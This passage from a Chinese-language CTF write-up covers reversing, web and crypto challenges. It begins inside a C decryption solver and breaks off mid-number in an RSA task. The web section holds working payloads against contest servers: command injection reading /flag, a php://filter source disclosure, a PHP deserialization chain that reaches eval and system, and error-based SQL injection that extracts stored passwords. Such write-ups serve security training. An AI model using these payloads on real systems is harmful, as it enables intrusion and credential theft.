        75, 224, 108, 30, 201, 78, 85, 237, 211, 188,
        255, 33, 44, 128, 141, 42, 19, 87, 167, 214,
        2, 93, 174, 249, 121, 100, 209, 67, 161, 156,
        162, 205, 21, 234, 176, 206, 49, 175, 99, 103,
        114, 163, 113, 80, 59, 225, 76, 183, 159, 112,
        5, 251, 184, 79, 149, 117, 35, 168, 236, 200,
        133, 88, 63, 29, 102, 227, 98, 16, 4, 0,
        81, 155, 198, 34, 142, 202, 12, 131, 136, 157,
        57, 189, 107, 129, 199, 64, 47, 41, 179, 104,
        7, 106, 91, 137, 215, 72, 232, 187, 15, 231,
        144, 147, 28, 66, 221, 226, 127, 243, 46, 82,
        62, 169, 125, 32, 220, 223};

// useless fake table!
uint8_t table2[256] = {
        0x52, 0x09, 0x6a, 0xd5, 0x30, 0x36, 0xa5, 0x38, 0xbf, 0x40, 0xa3, 0x9e, 0x81, 0xf3, 0xd7, 0xfb,
        0x7c, 0xe3, 0x39, 0x82, 0x9b, 0x2f, 0xff, 0x87, 0x34, 0x8e, 0x43, 0x44, 0xc4, 0xde, 0xe9, 0xcb,
        0x54, 0x7b, 0x94, 0x32, 0xa6, 0xc2, 0x23, 0x3d, 0xee, 0x4c, 0x95, 0x0b, 0x42, 0xfa, 0xc3, 0x4e,
        0x08, 0x2e, 0xa1, 0x66, 0x28, 0xd9, 0x24, 0xb2, 0x76, 0x5b, 0xa2, 0x49, 0x6d, 0x8b, 0xd1, 0x25,
        0x72, 0xf8, 0xf6, 0x64, 0x86, 0x68, 0x98, 0x16, 0xd4, 0xa4, 0x5c, 0xcc, 0x5d, 0x65, 0xb6, 0x92,
        0x6c, 0x70, 0x48, 0x50, 0xfd, 0xed, 0xb9, 0xda, 0x5e, 0x15, 0x46, 0x57, 0xa7, 0x8d, 0x9d, 0x84,
        0x90, 0xd8, 0xab, 0x00, 0x8c, 0xbc, 0xd3, 0x0a, 0xf7, 0xe4, 0x58, 0x05, 0xb8, 0xb3, 0x45, 0x06,
        0xd0, 0x2c, 0x1e, 0x8f, 0xca, 0x3f, 0x0f, 0x02, 0xc1, 0xaf, 0xbd, 0x03, 0x01, 0x13, 0x8a, 0x6b,
        0x3a, 0x91, 0x11, 0x41, 0x4f, 0x67, 0xdc, 0xea, 0x97, 0xf2, 0xcf, 0xce, 0xf0, 0xb4, 0xe6, 0x73,
        0x96, 0xac, 0x74, 0x22, 0xe7, 0xad, 0x35, 0x85, 0xe2, 0xf9, 0x37, 0xe8, 0x1c, 0x75, 0xdf, 0x6e,
        0x47, 0xf1, 0x1a, 0x71, 0x1d, 0x29, 0xc5, 0x89, 0x6f, 0xb7, 0x62, 0x0e, 0xaa, 0x18, 0xbe, 0x1b,
        0xfc, 0x56, 0x3e, 0x4b, 0xc6, 0xd2, 0x79, 0x20, 0x9a, 0xdb, 0xc0, 0xfe, 0x78, 0xcd, 0x5a, 0xf4,
        0x1f, 0xdd, 0xa8, 0x33, 0x88, 0x07, 0xc7, 0x31, 0xb1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xec, 0x5f,
        0x60, 0x51, 0x7f, 0xa9, 0x19, 0xb5, 0x4a, 0x0d, 0x2d, 0xe5, 0x7a, 0x9f, 0x93, 0xc9, 0x9c, 0xef,
        0xa0, 0xe0, 0x3b, 0x4d, 0xae, 0x2a, 0xf5, 0xb0, 0xc8, 0xeb, 0xbb, 0x3c, 0x83, 0x53, 0x99, 0x61,
        0x17, 0x2b, 0x04, 0x7e, 0xba, 0x77, 0xd6, 0x26, 0xe1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0c, 0x7d};

uint8_t real_table[256] = {209, 134, 160, 46, 208, 190, 120, 230, 111, 33, 54, 105, 216, 79, 108, 238, 207, 128, 39, 156, 130, 172, 83, 6, 107, 26, 85, 1, 242, 203, 143, 5, 253, 151, 213, 196, 103, 101, 64, 51, 106, 227, 155, 100, 152, 50, 248, 226, 57, 176, 81, 21, 112, 86, 53, 40, 132, 220, 4, 184, 74, 89, 250, 202, 225, 25, 243, 167, 96, 124, 67, 12, 235, 17, 82, 140, 186, 87, 145, 193, 183, 210, 249, 114, 110, 146, 30, 157, 201, 16, 48, 232, 72, 161, 3, 18, 52, 63, 206, 178, 165, 0, 204, 179, 229, 8, 231, 222, 142, 65, 125, 35, 189, 182, 180, 131, 95, 195, 84, 19, 139, 164, 118, 93, 133, 252, 62, 246, 153, 223, 20, 217, 126, 200, 41, 98, 218, 233, 32, 80, 121, 154, 214, 34, 240, 59, 70, 241, 28, 194, 66, 11, 15, 10, 56, 211, 169, 219, 36, 188, 13, 168, 170, 181, 31, 7, 60, 158, 197, 251, 71, 37, 92, 102, 162, 177, 174, 75, 97, 228, 78, 58, 77, 187, 192, 88, 23, 237, 149, 221, 99, 115, 2, 116, 14, 127, 117, 22, 212, 224, 199, 144, 215, 90, 49, 171, 175, 68, 104, 166, 119, 148, 24, 136, 159, 234, 69, 135, 94, 27, 254, 244, 47, 255, 141, 185, 245, 205, 73, 55, 91, 239, 236, 44, 173, 29, 198, 147, 61, 113, 109, 137, 123, 247, 9, 43, 38, 76, 45, 163, 42, 191, 138, 129, 122, 150};

uint8_t fn1(uint8_t a, uint8_t b)
{
    uint8_t i;
    uint8_t temp;
    uint8_t result[8];
    uint8_t sum = 0;
    result[0] = a;
    for (i = 1; i < 8; i++)
    {
        temp = result[i - 1];
        temp = temp >> 7;
        if (temp == 1)
        {
            result[i] = result[i - 1] << 1 ^ 0x1b;
        }
        else
        {
            result[i] = result[i - 1] << 1;
        }
    }
    for (i = 0; i < 8; i++)
    {
        temp = b << i & 0x80;
        if (temp == 0x80)
        {
            sum ^= result[7 - i];
        }
    }
    return sum;
}

void key_expansion(uint8_t a[16], uint8_t b[11][16])
{
    uint8_t RC[10];
    uint32_t v4[10];
    RC[0] = 1;
    int i;
    for (i = 1; i < 10; i++)
        RC[i] = fn1(0x02, RC[i - 1]);
    for (i = 0; i < 16; i++)
        b[0][i] = a[i];
    for (i = 1; i < 11; i++)
    {
        b[i][0] = b[i - 1][0] ^ table1[b[i - 1][13]] ^ RC[10 - i];
        b[i][1] = b[i - 1][1] ^ table1[b[i - 1][14]];
        b[i][2] = b[i - 1][2] ^ table1[b[i - 1][15]];
        b[i][3] = b[i - 1][3] ^ table1[b[i - 1][12]];
        b[i][4] = b[i - 1][4] ^ b[i][0];
        b[i][5] = b[i - 1][5] ^ b[i][1];
        b[i][6] = b[i - 1][6] ^ b[i][2];
        b[i][7] = b[i - 1][7] ^ b[i][3];
        b[i][8] = b[i - 1][8] ^ b[i][4];
        b[i][9] = b[i - 1][9] ^ b[i][5];
        b[i][10] = b[i - 1][10] ^ b[i][6];
        b[i][11] = b[i - 1][11] ^ b[i][7];
        b[i][12] = b[i - 1][12] ^ b[i][8];
        b[i][13] = b[i - 1][13] ^ b[i][9];
        b[i][14] = b[i - 1][14] ^ b[i][10];
        b[i][15] = b[i - 1][15] ^ b[i][11];
    }
}

void xor (uint8_t * a, uint8_t *b) {
    for (int i = 0; i < 16; i++)
        a[i] ^= b[i];
}

        void sbox(uint8_t *input)
{
    for (int i = 0; i < 16; i++)
        input[i] = table1[input[i]];
}

// wrong function
void insbox(uint8_t *input)
{
    for (int i = 0; i < 16; i++)
        input[i] = real_table[input[i]];
}

void reorder1(uint8_t *a)
{
    uint8_t b[16];
    b[0] = a[0];
    b[4] = a[4];
    b[8] = a[8];
    b[12] = a[12];
    b[1] = a[5];
    b[5] = a[9];
    b[9] = a[13];
    b[13] = a[1];
    b[2] = a[10];
    b[6] = a[14];
    b[10] = a[2];
    b[14] = a[6];
    b[3] = a[15];
    b[7] = a[3];
    b[11] = a[7];
    b[15] = a[11];
    for (int i = 0; i < 16; i++)
        a[i] = b[i];
}

void inreorder1(uint8_t *a)
{
    uint8_t b[16];
    b[0] = a[0];
    b[4] = a[4];
    b[8] = a[8];
    b[12] = a[12];
    b[1] = a[13];
    b[5] = a[1];
    b[9] = a[5];
    b[13] = a[9];
    b[2] = a[10];
    b[6] = a[14];
    b[10] = a[2];
    b[14] = a[6];
    b[3] = a[7];
    b[7] = a[11];
    b[11] = a[15];
    b[15] = a[3];
    for (int i = 0; i < 16; i++)
        a[i] = b[i];
}

void reorder2(uint8_t *a)
{
    uint8_t b[16];
    b[0] = a[0];
    b[4] = a[4];
    b[8] = a[8];
    b[12] = a[12];
    b[1] = a[13];
    b[5] = a[1];
    b[9] = a[5];
    b[13] = a[9];
    b[2] = a[10];
    b[6] = a[14];
    b[10] = a[2];
    b[14] = a[6];
    b[3] = a[7];
    b[7] = a[11];
    b[11] = a[15];
    b[15] = a[3];
    for (int i = 0; i < 16; i++)
        a[i] = b[i];
}

void inreorder2(uint8_t *a)
{
    uint8_t b[16];
    b[0] = a[0];
    b[4] = a[4];
    b[8] = a[8];
    b[12] = a[12];
    b[1] = a[5];
    b[5] = a[9];
    b[9] = a[13];
    b[13] = a[1];
    b[2] = a[10];
    b[6] = a[14];
    b[10] = a[2];
    b[14] = a[6];
    b[3] = a[15];
    b[7] = a[3];
    b[11] = a[7];
    b[15] = a[11];
    for (int i = 0; i < 16; i++)
        a[i] = b[i];
}

void mix_columns(uint8_t *a)
{
    uint8_t b[16];
    b[0] = fn1(0x02, a[0]) ^ fn1(0x03, a[1]) ^ a[2] ^ a[3];
    b[1] = fn1(0x02, a[1]) ^ fn1(0x03, a[2]) ^ a[3] ^ a[0];
    b[2] = fn1(0x02, a[2]) ^ fn1(0x03, a[3]) ^ a[0] ^ a[1];
    b[3] = fn1(0x02, a[3]) ^ fn1(0x03, a[0]) ^ a[1] ^ a[2];
    b[4] = fn1(0x02, a[4]) ^ fn1(0x03, a[5]) ^ a[6] ^ a[7];
    b[5] = fn1(0x02, a[5]) ^ fn1(0x03, a[6]) ^ a[7] ^ a[4];
    b[6] = fn1(0x02, a[6]) ^ fn1(0x03, a[7]) ^ a[4] ^ a[5];
    b[7] = fn1(0x02, a[7]) ^ fn1(0x03, a[4]) ^ a[5] ^ a[6];
    b[8] = fn1(0x02, a[8]) ^ fn1(0x03, a[9]) ^ a[10] ^ a[11];
    b[9] = fn1(0x02, a[9]) ^ fn1(0x03, a[10]) ^ a[11] ^ a[8];
    b[10] = fn1(0x02, a[10]) ^ fn1(0x03, a[11]) ^ a[8] ^ a[9];
    b[11] = fn1(0x02, a[11]) ^ fn1(0x03, a[8]) ^ a[9] ^ a[10];
    b[12] = fn1(0x02, a[12]) ^ fn1(0x03, a[13]) ^ a[14] ^ a[15];
    b[13] = fn1(0x02, a[13]) ^ fn1(0x03, a[14]) ^ a[15] ^ a[12];
    b[14] = fn1(0x02, a[14]) ^ fn1(0x03, a[15]) ^ a[12] ^ a[13];
    b[15] = fn1(0x02, a[15]) ^ fn1(0x03, a[12]) ^ a[13] ^ a[14];
    for (int i = 0; i < 16; i++)
        a[i] = b[i];
}

void inmix_columns(uint8_t *a)
{
    uint8_t b[16];
    b[0] = fn1(0x0E, a[0]) ^ fn1(0x0B, a[1]) ^ fn1(0x0D, a[2]) ^ fn1(0x09, a[3]);
    b[1] = fn1(0x0E, a[1]) ^ fn1(0x0B, a[2]) ^ fn1(0x0D, a[3]) ^ fn1(0x09, a[0]);
    b[2] = fn1(0x0E, a[2]) ^ fn1(0x0B, a[3]) ^ fn1(0x0D, a[0]) ^ fn1(0x09, a[1]);
    b[3] = fn1(0x0E, a[3]) ^ fn1(0x0B, a[0]) ^ fn1(0x0D, a[1]) ^ fn1(0x09, a[2]);
    b[4] = fn1(0x0E, a[4]) ^ fn1(0x0B, a[5]) ^ fn1(0x0D, a[6]) ^ fn1(0x09, a[7]);
    b[5] = fn1(0x0E, a[5]) ^ fn1(0x0B, a[6]) ^ fn1(0x0D, a[7]) ^ fn1(0x09, a[4]);
    b[6] = fn1(0x0E, a[6]) ^ fn1(0x0B, a[7]) ^ fn1(0x0D, a[4]) ^ fn1(0x09, a[5]);
    b[7] = fn1(0x0E, a[7]) ^ fn1(0x0B, a[4]) ^ fn1(0x0D, a[5]) ^ fn1(0x09, a[6]);
    b[8] = fn1(0x0E, a[8]) ^ fn1(0x0B, a[9]) ^ fn1(0x0D, a[10]) ^ fn1(0x09, a[11]);
    b[9] = fn1(0x0E, a[9]) ^ fn1(0x0B, a[10]) ^ fn1(0x0D, a[11]) ^ fn1(0x09, a[8]);
    b[10] = fn1(0x0E, a[10]) ^ fn1(0x0B, a[11]) ^ fn1(0x0D, a[8]) ^ fn1(0x09, a[9]);
    b[11] = fn1(0x0E, a[11]) ^ fn1(0x0B, a[8]) ^ fn1(0x0D, a[9]) ^ fn1(0x09, a[10]);
    b[12] = fn1(0x0E, a[12]) ^ fn1(0x0B, a[13]) ^ fn1(0x0D, a[14]) ^ fn1(0x09, a[15]);
    b[13] = fn1(0x0E, a[13]) ^ fn1(0x0B, a[14]) ^ fn1(0x0D, a[15]) ^ fn1(0x09, a[12]);
    b[14] = fn1(0x0E, a[14]) ^ fn1(0x0B, a[15]) ^ fn1(0x0D, a[12]) ^ fn1(0x09, a[13]);
    b[15] = fn1(0x0E, a[15]) ^ fn1(0x0B, a[12]) ^ fn1(0x0D, a[13]) ^ fn1(0x09, a[14]);
    for (int i = 0; i < 16; i++)
        a[i] = b[i];
}

void encrypt(uint8_t input[16], uint8_t input_ciphertext[16], uint8_t round_key[11][16], int total_round)
{
    int i, round;
    for (i = 0; i < 16; i++)
    {
        input_ciphertext[i] = input[i];
    }
    printf("input_ciphertext: ");
    printhex(input_ciphertext);

    xor(input_ciphertext, round_key[0]);

    printf("encrypt round 0: ");
    printhex(input_ciphertext);

    for (round = 1; round < total_round; round++)
    {
        //
        printf("+ encrypt round %d START: ", round);
        printhex(input_ciphertext);

        mix_columns(input_ciphertext);

        printf("++ encrypt round %d MIXCL: ", round);
        printhex(input_ciphertext);

        sbox(input_ciphertext);

        printf("+++ encrypt round %d SBOX : ", round);
        printhex(input_ciphertext);

        reorder1(input_ciphertext);

        printf("++++ encrypt round %d REORD: ", round);
        printhex(input_ciphertext);

        xor(input_ciphertext, round_key[round]);

        printf("+++++ encrypt round %d END  : ", round);
        printhex(input_ciphertext);

        //
        uint8_t temp[16];
        memcpy(temp, input_ciphertext, 16);

        printf("----- decrypt round %d START: ", round);
        printhex(temp);

        xor(temp, round_key[round]);

        printf("---- decrypt round %d REORD: ", round);
        printhex(temp);

        inreorder1(temp);

        printf("--- decrypt round %d SBOX : ", round);
        printhex(temp);

        insbox(temp);

        printf("-- decrypt round %d MIXCL: ", round);
        printhex(temp);

        inmix_columns(temp);

        printf("- decrypt round %d END  : ", round);
        printhex(temp);
    }
    sbox(input_ciphertext);
    reorder1(input_ciphertext);
    xor(input_ciphertext, round_key[total_round]);
}

void decrypt(uint8_t flag_ciphertext[16], uint8_t flag[16], uint8_t round_key[11][16], int total_round)
{
    int i, round;
    for (i = 0; i < 16; i++)
    {
        flag[i] = flag_ciphertext[i];
    }
    printf("flag_ciphertext: %16s\n", flag_ciphertext);

    xor(flag, round_key[total_round]);
    inreorder1(flag);
    insbox(flag);
    for (round = total_round - 1; round > 0; round--)
    {
        xor(flag, round_key[round]);

        inreorder1(flag);
        insbox(flag);
        inmix_columns(flag);
    }
    xor(flag, round_key[0]);
}

int main()
{
    int i = 0;
    uint8_t round_key[11][16];
    uint8_t flag_ciphertext[16] = {218, 14, 205, 50, 168, 89, 88, 62, 25, 222, 96, 18, 18, 129, 198, 36};
    uint8_t input_ciphertext[17];
    uint8_t input[17] = "flag{xxxxxxxxxx}";
    uint8_t key[16] = {
            0x5A, 0x0D, 0x9D, 0x04, 0x60, 0xAE, 0x05, 0xBB, 0x85, 0x6B,
            0x13, 0xB5, 0x73, 0xCF, 0x3D, 0x1E};

    // initialize, set 0
    for (int a = 0; a < 16; a++)
    {
        input_ciphertext[a] = 0;
    }
    input[16] = 0;
    for (int a = 0; a < 11; a++)
    {
        for (int b = 0; b < 16; b++)
        {
            round_key[a][b] = 0;
        }
    }

    // start encryption
    key_expansion(key, round_key);
    encrypt(input, input_ciphertext, round_key, 10);
    // end encryption

    uint8_t flag[17];
    decrypt(flag_ciphertext, flag, round_key, 10);
    printf("FLAG: \n%16s\n", flag);

    // // verify
    // for (i = 0; i < 16; i++)
    // {
    //     // data2 is ciphertext, data3 is input's ciphertext
    //     if (input_ciphertext[i] != flag_ciphertext[i])
    //     {
    //         printf("Verification failed at %d\n", i);
    //         return 0;
    //     }
    // }
    // printf("Right!");
    // printf("Your flag: flag{%16s}", input);
    return 0;
}
```

## Web

### Hack Ping

查看源代码发现只做了前端检查。

```
POST http://210.30.97.133:10091/
command=;cat /flag

Response:
flag=flag{ed8b7faa-5345-46e9-b90b-b94b64c37b91}
```

### ezphp

```
POST http://210.30.97.133:10065/getflag.php?DLUT=2023SSSCTF

Response:
SSSCTF{this_is_an_easy_web}
```

### INFO SELECTION

使用 dirsearch 扫描后可知：

```
/index.php.bak
This is the first part of the flag:
flag{Pr0tEct_Y

/robots.txt
User-agent:*
Disallow:/fff11111111llllaaggggg.txt

/fff11111111llllaaggggg.txt
This is the second part of the flag:
ouR_1nfOrMat

/www.zip
This is the third part of flag:
Ion_CaReFuL1y!}
```

### ezphp2.0

> ezphp 的加强版捏 PS:flag 在 flag.php 中

```php
<?php
$DLUT = $_GET['DLUT'];
$WEB1 = $_GET['WEB1'];
$WEB2 = $_GET['WEB2'];
if(isset($DLUT)){
    if($DLUT === "A306"){
        echo('<span style="color: #2c2c54; font-size: 32px;">'. "欢迎来到螺丝工作室(*^▽^*)".'</span>');
        if(isset($WEB1) && isset($WEB2)){
            if($WEB1 == 114514 && $WEB1 != $WEB2 && $WEB2 == 114514){
                echo('<span style="color: #2c2c54; font-size: 32px;">'. "接下来是个大boss，拿好！".'</span>');
                $file = $_GET['file'];
                include($file);
            }else{
                echo('<span style="color: #2c2c54; font-size: 32px;">'. "有点逆天的答案(•́へ•́╬)".'</span>');
            }
        }else{
            echo('<span style="color: #2c2c54; font-size: 32px;">'. "想要flag？也总不能拿一个半成品来换吧o(´^｀)o".'</span>');
        }
    }else{
        echo('<span style="color: #2c2c54; font-size: 32px;">'. "怎么走错地方了，螺丝在A306捏(ಥ_ಥ) ".'</span>');
    }
}else{
    echo('<span style="color: #2c2c54; font-size: 32px;">'. "啥都不给就想拿flag？？？？？？┗( ▔, ▔ )┛".'</span>');
}
?>
```

这里需要用到 php 中的几个特性：

1. 与数字比较时会自动转换为数字
2. 使用 php 伪协议将 php 文件编码为 base64 可以避免执行，从而得到原文

```
GET http://210.30.97.133:10078/?DLUT=A306&WEB1=114514&WEB2=114514a&file=php://filter/read=convert.base64-encode/resource=flag.php

Response:
T0hISEhISEhISEhISCEKWW91IEp1c3QgR2V0IFRoZSBGbGFnISEhIQpTbyBOZXdCZWUh4pSAPeKJoc6jKCgo44Gk4oCizIDPieKAosyBKeOBpOKUgD3iiaHOoygoKOOBpOKAosyAz4nigKLMgSnjgaTilIA94omhzqMoKCjjgaTigKLMgM+J4oCizIEp44GkClRoaXMgaXMgdGhlIGZsYWc6Cjw/cGhwCiRGTEFHID0gJ2ZsYWd7NjM1YWI5ZmQtMjc1Mi00YzczLWJkMDgtOGZhNDdiMjQyOWY1fSc7Cj8+
```

解密后得到：

```php
OHHHHHHHHHHHH!
You Just Get The Flag!!!!
So NewBee!─=≡Σ(((つ•̀ω•́)つ─=≡Σ(((つ•̀ω•́)つ─=≡Σ(((つ•̀ω•́)つ
This is the flag:
<?php
$FLAG = 'flag{635ab9fd-2752-4c73-bd08-8fa47b2429f5}';
?>
```

### ！动起，案档蓝蔚

> ~叭 galf 找找来就那，嘛玩叔大和想

```php
<?php
error_reporting(0);
highlight_file(__FILE__);

class Archive {
    protected $game;
    public function __construct($game){
        $this->game=$game;
    }
    public function launch($what){
        echo $what."启动！<br>";
        eval($what);
    }
    public function __get($obj){
        $this->launch($this->game);
        return "<br>hi<br>";
    }
}

class Blue{
    public $source;
    public $str;
    public function __construct($welcome='蔚蓝档案启动器！<br>'){
        $this->source = $welcome;
        echo '欢迎来到'.$this->source."<br>";
    }
    public function __toString(){
        return $this->str->source;
    }
}

class Printer{
    public $content;
    public function __construct($content="还想找大叔玩？<br>"){
        echo "word count:".strlen($content);
        $this->content=$content;
        $this->print();
    }
    public function __destruct(){
        echo "word count:".strlen($content)."<br>";
        $this->print();
    }
    public function print(){
        echo $this->content."<br>";
    }
}

if(isset($_POST['ba'])){
    unserialize($_POST['ba']);
}
else{
    die("走错了捏<br>");
}
```

审计后发现，可以使用 php 反序列化漏洞。需要利用`Archive.launch`中的`eval()`来执行代码，而`Archive.launch`可以被`Archive.__get`函数调用，所以需要用到`Blue.__to_string`中的`$this->str->source`来触发`Archive.__get`函数。而`Printer.__destruct`中的`print()`函数可以触发`Blue.__to_string`函数。需要注意的是，因为`Archive.game`的类型为`protected`，反序列的时候需要在属性名前加上`\0*\0`，这里使用`python`来达成这个要求：

```python
import requests

x = requests.post(
    "http://210.30.97.133:10027/",
    {
        "ba": 'O:7:"Printer":1:{s:7:"content";O:4:"Blue":2:{s:6:"source";s:4:"game";s:3:"str";O:7:"Archive":1:{s:7:"\0*\0game";s:37:"echo \'===\'.system(\'cat /flag\').\'===\';";}}}'
    },
)
print(x.text)
```

### SleepyHead

> 星野前辈又在睡午觉啦~
>
> 老师快去敲一敲大叔的小脑瓜，让阿拜多斯的实力担当给你 flag 叭~

这一题考的都是 HTTP Headers，按照要求修改即可：

```
GET /
User-Agent=Scr1w
Referer=Scr1w.Studio
DNT=1
Via=claaaaash.mono
X-Forwarded-For127.0.0.1
```

### 教科书级的系统

> 或许有教科书级的漏洞？

访问首页时发现返回了 302 重定向到`/Login`，同时发送了用户名和密码`<!--defaultuser fdsaui92@1-->`。登录后发现可以提交投诉，尝试`'`后发现会报错，可以使用 SQL 报错注入。首先获取数据表信息：

```
POST /Dashboard
title=就吃就吃
content=' or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) or '

Response:
java.sql.SQLException: XPATH syntax error: '~SPRING_SESSION,SPRING_SESSION_A'
```

发现结果会被截断，可以使用`right`多次发送请求得到完整内容：

```
POST /Dashboard
title=就吃就吃
content=' or updatexml(1,concat(0x7e,right((select group_concat(table_name) from information_schema.tables where table_schema=database()),30),0x7e),1) or '

Response:
java.sql.SQLException: XPATH syntax error: '~ON_ATTRIBUTES,complaints,users~'
```

然后获取 users 表信息：

```
POST /Dashboard
title=就吃就吃
content=' or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users'),0x7e),1) or '

Response:
java.sql.SQLException: XPATH syntax error: '~id,name,password~'
```

最后读取 password 得到 flag：

```
POST /Dashboard
title=就吃就吃
content=' or updatexml(1,concat(0x7e,right((select group_concat(password) from users),30),0x7e),1) or '

Response:
java.sql.SQLException: XPATH syntax error: '~f-a1f7-4d83-8cfd-b51d10e92e09}~'

POST /Dashboard
title=就吃就吃
content=' or updatexml(1,concat(0x7e,right((select group_concat(password) from users),60),0x7e),1) or '

Response:
java.sql.SQLException: XPATH syntax error: '~fdsaui92@1,flag{e6c7668f-a1f7-4'
```

### FlagShop

> 点击按钮帮我砍一刀~

访问`/robots.txt`发现隐藏目录`/sharpshop.tar`，访问后得到源代码。猜测为条件竞争攻击。使用请求库同时快速请求`buy`和`cutDown`即可得到 flag。

## CRYPTO

### 等比数列?

> 小明高中毕业来到大学遇到了这样的问题，一眼丁真，这不等比数列吗?等等，好像哪里不太对，学习了模运算后，小明得到了初始的 a0，你也试试看吧！

```python
from Crypto.Util.number import *

# a0 q
n = 710009


def go():
    for x in range(1000, 10000):
        for y in range(1000, 10000):
            a0 = x
            q = y

            check1 = False
            check2 = False

            for i in range(67):
                a0 = a0 * q % n
                if i == 30 and a0 == 338473:
                    check1 = True
                    print(x, y, "has passed check1")
                if i == 66 and a0 == 519563:
                    check2 = True
                    print(x, y, "has passed check2")
            if check1 and check2:
                print(x, y, "is the answer!!!")
                return


go()

# 338473
# 519563
```

### 我也很异或呢 O.o

> ^\_^

```python
from Crypto.Util.number import *

flag = b"5\x0f\x13V\x0c+S\x00n\x03;\x06-Y\x12?\x0f-^\x02'<\x1dW(*\x0c\x07\x10\n"
key = b"Scr1w"


def xor(flag, key):
    out = b""

    for i in range(len(flag)):
        out += bytes([flag[i] ^ key[i % len(key)]])

    return out


enc = xor(flag, key)
print(enc)
# b"5\x0f\x13V\x0c+S\x00n\x03;\x06-Y\x12?\x0f-^\x02'<\x1dW(*\x0c\x07\x10\n"

# flag{x0r_the_hell_out_of_you!}
```

### basic-RSA

> let me tell a story about RSA

```python
# python是ctf中最常用的语言，请你通过搜索引擎，自行安装python，并学习如何为python安装第三方库
# 在配置好python环境后，你需要自行安装pycryptodome库、gmpy2库
# 在完成所有配置后，可以运行这段代码，得到你的flag！
from Crypto.Util.number import *

# 导入我们下载的crypto库，方便后续使用库中的函数

# bytes_to_long()函数，把字母转成数字
m = bytes_to_long(b"**********************************")

# 生成两个随机的素数，取名p和q
e = 65537
p = getPrime(512)
q = getPrime(512)

# 计算p乘q
n = p * q

# RSA加密，pow()实现了次幂运算，第三个参数是模数，例如pow(2,4,3)=(2*2*2*2) % 3 = 1
c = pow(m, e, n)

# 输出p、q、c
print(p, q, c)

# 下面是解密代码，当你配好所需要的python环境后，上网自行搜索RSA解密的步骤，补全代码进行解密
p = 11272029161810989637077873599019496877008218675207504587156140192021377360482704022176035187554108368278190548694137066116291687848811218316609251992398531
q = 8907273588185400007517004981004813156071713948292117095141121709405743482454098895087505262599398998351848699006495710441163005192326918043131527773275261
n = p * q
e = 65537
phi = (p - 1) * (q - 1)
d = pow(e, -1, phi)
c = 59456089016060766225332390698350903116623033134514592830079717766948507914949032997169195220803642273910722815705790231122189278462009688705900558121892002228836045157732582528181395382772779860190430228823868911649968133987708461443646703064201375236983090379446718660629027030001866595377945046940440636896
print(long_to_bytes(pow(c, d, n)))

# flag{Th3_f1r3t_Try_ln_cR7pt0}
```

### Teloivts's RSA

> Teloivts 不愧是逆向手，还会帮你解密

选择密文攻击。

`// TODO`

### X^2-RSA

```python
from Crypto.Util.number import *
from gmpy2 import *
import sympy

p = 11246366507521251547723533645380046156367514991599743075177889516287038483623244552248887557384179000924422806798918864086737013365530344283291981971571611
q = 10634522010236639283303970662974728803236879651978982528699871082708199875802385883049609559375108278290618023637759656371129572073552695009281800773621539
e = 7769676358871607921186856199138422203650287630632141774546764887509924347152424455516885544235759528955652952931397320557884243885395454721512301084152617


# n = p * q
n = 119599732159422912237126092503633593127444912729791769936188025920440247693519660056564377003327876458608897540804699714727762677074095341934117636626737553788910255544086673845028462552403437563867021138226332533523261069120346290748100178821888057505879672808893138750370221354811388445573458187283950529329
assert n == p * q

# c = pow(bytes_to_long(flag), e, n)
c = 26993320920246459282903918258141924700555534517795083322600888678032578078748098842182757614410623183383625789026194273160849599428611123639374938192451695449150144414006335708435850583611654329589400433382496740881780217929655022786322641976440238749489472351300088441838107888022748740774750642665176409512

# gift1 = p + q
gift1 = 21880888517757890831027504308354774959604394643578725603877760598995238359425630435298497116759287279215040830436678520457866585439083039292573782745193150
assert gift1 == p + q

# gift2 = e**2 % p
gift2 = 10396530748040666625822969282831155457018939705806203185375728535142910851038248041763489482743937736843953702379394388895553869400661190661679347693932652


def Legendre(n, p):  # 这里用勒让德符号来表示判断二次（非）剩余的过程
    return pow(n, (p - 1) // 2, p)


def Tonelli_Shanks(n, p):
    assert Legendre(n, p) == 1
    if p % 4 == 3:
        return pow(n, (p + 1) // 4, p)
    q = p - 1
    s = 0
    while q % 2 == 0:
        q = q // 2
        s += 1
    for z in range(2, p):
        if Legendre(z, p) == p - 1:
            c = pow(z, q, p)
            break
    r = pow(n, (q + 1) // 2, p)
    t = pow(n, q, p)
    m = s
    if t % p == 1:
        return r
    else:
        i = 0
        while t % p != 1:  # 外层循环的判断条件
            temp = pow(t, 2 ** (i + 1), p)  # 这里写作i+1是为了确保之后内层循环用到i值是与这里的i+1的值是相等的
            i += 1
            if temp % p == 1:  # 内层循环的判断条件
                b = pow(c, 2 ** (m - i - 1), p)
                r = r * b % p
                c = b * b % p
                t = t * c % p
                m = i
                i = 0  # 注意每次内层循环结束后i值要更新为0
        return r


phi = (p - 1) * (q - 1)
d = sympy.mod_inverse(e, phi)
flag = pow(c, d, n)
print(long_to_bytes(flag))

# flag{Quadratic_residue_is_useful_in_crypto}
```

### Wiener's RSA

```python
from Crypto.Util.number import *
import gmpy2

# flag = b''
# p = getPrime(1024)
# q = getPrime(1024)
# n = p * q
# d = getPrime(50)
# e = inverse(d, (p-1)*(q-1))

# m1 = bytes_to_long(flag[:len(flag)//2])
# m2 = bytes_to_long(flag[len(flag)//2:])
# c1 = pow(2023 * n ** 4 + 1, m1, n ** 5)
# c2 = pow(m2, e, n)

# print(f"c1={c1}")
# print(f"c2={c2}")
# print(f"n={n}")
# print(f"e={e}")

# e * d mod (p-1)(q-1) = 1

c1 = 59293035414627236242686472344993606130786232841388351781917929423461686535089345478112834930546150853546403757993597682996574437927939365910025208412690986622693709974056834009713059595006392611996681648958991625894645819652571863977551117415214684802499620728518917739594136844060782583321462623705503127895230107231322139935982418156126188907469852097901484442808277616937484028171987376425135464934035472469987689970632592688914137416003678157338312368215543890697082369873934068531903060953530573896351541703963337765365721822817257830831233178076511434666207064435874002471999529094287674412989122495690238889809714809387464792577268392780548352119284726650615404992519250709856700753885836074965677017774117505154825191482699725793050351329183842269942063500018260213819181118385380047126097474120399500101323720084469306516748584483811219438007979392980451510827573144983074890737921459683135225311533502097298383463646484767206798116143762162537836796062432029551530798138641802500089187725406188226438114761910758119404600009860620429419849729554766183205256669220730915703363649070720340359859371284769116822482640080012647259250120384255495309319046636847852663767789634456385396367846391